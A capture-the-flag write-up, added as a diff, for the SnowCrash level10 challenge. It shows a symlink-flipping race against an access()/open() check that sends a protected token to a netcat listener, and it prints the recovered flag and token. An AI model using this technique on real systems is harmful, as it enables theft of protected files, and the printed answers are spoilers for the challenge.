@@ -1,0 +1,84 @@
+$> ls -la
+there is an executable and a token file
+
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+level10@SnowCrash:~$ cat token
+cat: token: Permission denied
+level10@SnowCrash:~$ ./level10 token
+./level10 file host
+	sends file to host if you have access to it
+
+$> strings ./level10
+open
+access
+strerror
+__libc_start_main
+write
+GLIBC_2.4
+GLIBC_2.0
+PTRh
+UWVS
+[^_]
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 ..
+Unable to connect to host %s
+
+level10@SnowCrash:~$ ./level10 token localhost:6969
+You don't have access to token
+
+We can't download the token file locally, we don't have permission.
+man access: checks whether the calling process can access the file
+pathname.  If pathname is a symbolic link, it is dereferenced.
+Warning: Using these calls to check if a user is authorized to,
+for example, open a file before actually doing so using open(2)
+creates a security hole, because the user might exploit the short
+time interval between checking and opening the file to manipulate
+it.  For this reason, the use of this system call should be
+avoided.
+
+-> We can exploit this short time interval between checking and opening the file.
+
+In another terminal in the snowcrash vm, listening to the port 6969
+$> nc 6969 -lk
+(-k: to keep listening after receiving anything)
+
+In another terminal (ssh to the snowcrash vm):
+$> level10@SnowCrash:~$ echo "hello you" > /tmp/test
+level10@SnowCrash:~$ ./level10 /tmp/test 192.168.56.101
+Connecting to 192.168.56.101:6969 .. Connected!
+Sending file .. wrote file!
+
+
+We receive the information in the terminal listening :
+level10@SnowCrash:~$ nc 6969 -lk
+.*( )*.
+hello you
+
+The most critical step (i.e., making /tmp/XYZ point to the password file) of our race condition attack must occur within the window between check and use; namely between the access() and the fopen() calls in the vulnerable program. Since we cannot modify the vulnerable program, the only thing that we can
+do is to run our attacking program in parallel to “race” against the target program, hoping to win the race condition, i.e., changing the link within that critical window
+
+https://samsclass.info/127/proj/E10.htm
+https://capec.mitre.org/data/definitions/27.html
+
+Verify ability to write to filesystem: The attacker verifies ability to write to the target host's file system by creating a file.
+$> echo hello > /tmp/hello
+
+Replace file with a symlink to a sensitive system file.: Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.
+Here the "f" option means that if the link exists, remove the old one first
+$> while true; do ln -fs /tmp/hello /tmp/flip; ln -fs ~/token /tmp/flip; done
+
+In another terminal, run the program with the symbolic link
+$> while true; do ./level10 /tmp/flip 192.168.56.101; done
+
+In the terminal listening, we get the flag:
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+
+-> su flag10
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+--> su level11
